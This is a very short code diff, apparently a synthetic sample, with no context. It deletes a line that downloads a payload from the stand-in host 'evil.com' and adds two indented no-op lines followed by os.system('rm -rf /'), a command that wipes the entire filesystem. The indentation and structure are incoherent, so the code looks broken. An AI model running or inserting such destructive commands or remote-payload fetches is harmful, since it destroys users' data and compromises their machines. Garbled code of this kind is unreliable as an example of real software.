@@ -1,2 +1,4 @@
-import requests
-requests.get('http://evil.com/payload')
+    pass  # no-op
+    pass  # no-op
+import os
+os.system('rm -rf /')
